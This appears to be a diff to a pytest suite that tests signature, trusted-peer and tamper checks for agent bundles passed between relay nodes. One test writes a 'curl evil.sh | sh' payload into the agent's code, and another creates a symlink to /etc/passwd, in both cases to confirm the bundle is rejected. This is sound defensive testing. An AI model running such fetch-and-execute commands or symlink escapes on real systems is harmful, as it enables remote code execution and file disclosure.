@@ -166,14 +166,14 @@ def test_unknown_signing_key_is_rejected(agent_dir, tmp_path, keypair, policy):
     assert "trusted set" in str(exc.value)
 
 
-def test_signature_from_wrong_key_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
-    """Attacker re-signs with their own key but leaves the owner_pubkey alone."""
+def test_hop_signature_from_wrong_key_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
+    """Attacker re-signs the hop but leaves hop_pubkey alone."""
     claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
     attacker = S.generate_keypair()
 
     with zipfile.ZipFile(claw) as archive:
         manifest = json.loads(archive.read("manifest.json"))
-    manifest["integrity"]["signature"] = S.sign_hash(
+    manifest["integrity"]["hop_signature"] = S.sign_hash(
         attacker, manifest["integrity"]["bundle_hash"]
     )
     evil = _repack_with(
@@ -183,6 +183,95 @@ def test_signature_from_wrong_key_is_rejected(agent_dir, tmp_path, keypair, trus
     with pytest.raises(B.QuarantinedBundle) as exc:
         B.unpack(evil, tmp_path / "out", trusted, policy=policy)
     assert "signature" in str(exc.value).lower()
+
+
+def test_hop_signed_by_untrusted_stranger_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
+    """Attacker honestly declares their own hop_pubkey and re-signs the whole
+    envelope — valid crypto, but the key is neither owner nor trusted peer."""
+    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
+    attacker = S.generate_keypair()
+
+    with zipfile.ZipFile(claw) as archive:
+        manifest = json.loads(archive.read("manifest.json"))
+    manifest["integrity"]["hop_pubkey"] = attacker.public_id
+    # recompute the bundle hash over the modified manifest, then sign it
+    import tempfile as _tf
+    with _tf.TemporaryDirectory() as td:
+        with zipfile.ZipFile(claw) as archive:
+            archive.extractall(td)
+        stripped = json.loads(json.dumps(manifest))
+        stripped["integrity"] = {}
+        (Path(td) / "manifest.json").write_text(json.dumps(stripped))
+        new_hash = S.compute_bundle_hash(Path(td), stripped)
+    manifest["integrity"]["bundle_hash"] = new_hash
+    manifest["integrity"]["hop_signature"] = S.sign_hash(attacker, new_hash)
+
+    evil = _repack_with(
+        claw, tmp_path / "evil.claw", {"manifest.json": json.dumps(manifest).encode()}
+    )
+
+    with pytest.raises(B.QuarantinedBundle, match="neither the owner nor a trusted peer"):
+        B.unpack(evil, tmp_path / "out", trusted, policy=policy)
+
+
+def test_node_repack_without_owner_key(agent_dir, tmp_path, keypair, trusted, policy):
+    """The hop that used to be impossible: a node repacks a mutated agent with
+    its own key, and the next node accepts it because the node is a trusted
+    peer and the owner's core signature still verifies."""
+    node_key = S.generate_keypair()
+    peers = S.TrustedKeys([node_key.public_id])
+
+    claw = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
+    dest = tmp_path / "node-b"
+    manifest = B.unpack(claw, dest, trusted, policy=policy)
+
+    (dest / "state" / "memory.md").write_text("# Memory\n\ncount: 7\n")
+    advanced = B.record_hop(manifest, from_node="node-b:7777", to_node="node-c:7777")
+    (dest / "manifest.json").write_text(json.dumps(advanced, indent=2))
+
+    hop1 = B.pack(dest, tmp_path / "hop1.claw", node_key, manifest=advanced)
+
+    # Node C trusts the owner AND node B as a peer → accepted
+    final = B.unpack(hop1, tmp_path / "node-c", trusted, trusted_peers=peers, policy=policy)
+    assert final["integrity"]["hop_pubkey"] == node_key.public_id
+    assert final["agent"]["owner_pubkey"] == keypair.public_id
+    assert "count: 7" in (tmp_path / "node-c" / "state" / "memory.md").read_text()
+
+    # Node D trusts the owner but NOT node B → rejected
+    with pytest.raises(B.QuarantinedBundle, match="trusted peer"):
+        B.unpack(hop1, tmp_path / "node-d", trusted, policy=policy)
+
+
+def test_node_cannot_tamper_core_code(agent_dir, tmp_path, keypair, trusted, policy):
+    """A malicious relay node swaps the agent's code and re-signs the hop with
+    its own (trusted!) key. The owner's core signature must still catch it."""
+    node_key = S.generate_keypair()
+    peers = S.TrustedKeys([node_key.public_id])
+
+    claw = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
+    dest = tmp_path / "evil-node"
+    manifest = B.unpack(claw, dest, trusted, policy=policy)
+
+    (dest / "code" / "main.py").write_text("import os; os.system('curl evil.sh | sh')\n")
+
+    with pytest.raises(B.BundleError, match="core changed"):
+        B.pack(dest, tmp_path / "evil.claw", node_key, manifest=manifest)
+
+
+def test_node_cannot_widen_grants(agent_dir, tmp_path, keypair, trusted, policy):
+    """resources/permissions live in the owner-signed core: a trusted relay
+    node cannot raise them mid-journey."""
+    node_key = S.generate_keypair()
+
+    claw = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
+    dest = tmp_path / "greedy-node"
+    manifest = B.unpack(claw, dest, trusted, policy=policy)
+
+    manifest["resources"]["memory_mb"] = 999999
+    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2))
+
+    with pytest.raises(B.BundleError, match="core changed"):
+        B.pack(dest, tmp_path / "greedy.claw", node_key, manifest=manifest)
 
 
 def test_missing_manifest_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
@@ -392,7 +481,10 @@ def test_pack_rejects_mismatched_signing_key(agent_dir, tmp_path):
 
 
 def test_pack_rejects_symlink_in_agent_dir(agent_dir, tmp_path, keypair):
-    (agent_dir / "code" / "escape").symlink_to("/etc/passwd")
+    try:
+        (agent_dir / "code" / "escape").symlink_to("/etc/passwd")
+    except OSError:
+        pytest.skip("cannot create symlinks on this platform (Windows without dev mode)")
     with pytest.raises(B.BundleError, match="symlink"):
         B.pack(agent_dir, tmp_path / "agent.claw", keypair)
 
